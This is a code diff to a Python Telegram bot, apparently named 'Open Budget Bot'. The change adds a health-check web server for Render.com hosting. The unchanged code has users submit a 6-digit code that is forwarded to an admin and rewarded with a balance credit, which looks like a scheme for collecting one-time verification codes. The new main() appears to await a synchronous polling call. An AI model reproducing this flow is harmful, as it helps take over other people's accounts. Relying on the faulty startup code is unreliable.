@@ -6,6 +6,7 @@ from aiogram import Bot, Dispatcher, types
 from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
 from aiogram.utils import executor
 from dotenv import load_dotenv
+from aiohttp import web
 
 load_dotenv()
 
@@ -16,6 +17,7 @@ logger = logging.getLogger(__name__)
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
 DATABASE_URL = os.getenv("DATABASE_URL")
+PORT = int(os.getenv("PORT", 8080))  # Render.com uchun port
 
 if not BOT_TOKEN:
     logger.error("❌ BOT_TOKEN topilmadi!")
@@ -183,7 +185,7 @@ async def receive_code(message: types.Message):
         await message.answer("❌ Iltimos, 6 xonali raqamli kod kiriting:")
         return
     
-    # Kodni bazaga saqlash (foydalanuvchi kiritgan kod)
+    # Kodni bazaga saqlash
     try:
         conn = await get_db()
         await conn.execute(
@@ -201,7 +203,7 @@ async def receive_code(message: types.Message):
         "Admin tekshirib, tasdiqlaydi..."
     )
     
-    # ADMIN'GA KODNI YUBORISH (Tekshirish uchun)
+    # ADMIN'GA KODNI YUBORISH
     try:
         keyboard = InlineKeyboardMarkup(row_width=2)
         keyboard.add(
@@ -247,7 +249,6 @@ async def admin_action(callback: types.CallbackQuery):
             )
             
             if result == "UPDATE 1":
-                # Balansga qo'shish
                 await conn.execute(
                     "UPDATE users SET balance = balance + 50000 WHERE telegram_id = $1",
                     telegram_id
@@ -258,7 +259,6 @@ async def admin_action(callback: types.CallbackQuery):
                 )
                 await conn.close()
                 
-                # Foydalanuvchiga xabar
                 try:
                     await bot.send_message(
                         telegram_id,
@@ -271,7 +271,6 @@ async def admin_action(callback: types.CallbackQuery):
                 except Exception as e:
                     logger.error(f"❌ Foydalanuvchiga xabar yuborishda xatolik: {e}")
                 
-                # Admin'ga javob
                 await callback.message.edit_text(
                     f"✅ <b>TASDIQLANDI!</b>\n\n"
                     f"🆔 ID: {telegram_id}\n"
@@ -302,7 +301,6 @@ async def admin_action(callback: types.CallbackQuery):
             )
             await conn.close()
             
-            # Foydalanuvchiga xabar
             try:
                 await bot.send_message(
                     telegram_id,
@@ -313,7 +311,6 @@ async def admin_action(callback: types.CallbackQuery):
             except Exception as e:
                 logger.error(f"❌ Foydalanuvchiga xabar yuborishda xatolik: {e}")
             
-            # Admin'ga javob
             await callback.message.edit_text(
                 f"❌ <b>RAD ETILDI!</b>\n\n"
                 f"🆔 ID: {telegram_id}\n"
@@ -455,13 +452,42 @@ async def check_balance(message: types.Message):
         logger.error(f"❌ Balans xatosi: {e}")
         await message.answer("❌ Balansni olishda xatolik!")
 
-# ================= 9. MAIN =================
+# ================= WEB SERVER (Render.com uchun) =================
+async def handle_health(request):
+    """Health check endpoint"""
+    return web.Response(text="Bot is running!")
+
+async def handle_root(request):
+    """Root endpoint"""
+    return web.Response(text="Open Budget Bot - Web Service")
+
+async def start_web_server():
+    """Web serverni ishga tushirish"""
+    app = web.Application()
+    app.router.add_get('/', handle_root)
+    app.router.add_get('/health', handle_health)
+    
+    runner = web.AppRunner(app)
+    await runner.setup()
+    site = web.TCPSite(runner, '0.0.0.0', PORT)
+    await site.start()
+    logger.info(f"✅ Web server {PORT} portda ishga tushdi")
+
+# ================= MAIN =================
 async def on_startup(dp):
     logger.info("🤖 Bot ishga tushmoqda...")
     logger.info(f"🔑 Bot token: {BOT_TOKEN[:10]}...")
     logger.info(f"👤 Admin ID: {ADMIN_ID}")
+    logger.info(f"🌐 Web server port: {PORT}")
     await init_db()
     logger.info("✅ Bot tayyor!")
 
+async def main():
+    # Web serverni ishga tushirish
+    await start_web_server()
+    
+    # Botni ishga tushirish
+    await executor.start_polling(dp, on_startup=on_startup, skip_updates=True)
+
 if __name__ == "__main__":
-    executor.start_polling(dp, on_startup=on_startup, skip_updates=True)
+    asyncio.run(main())
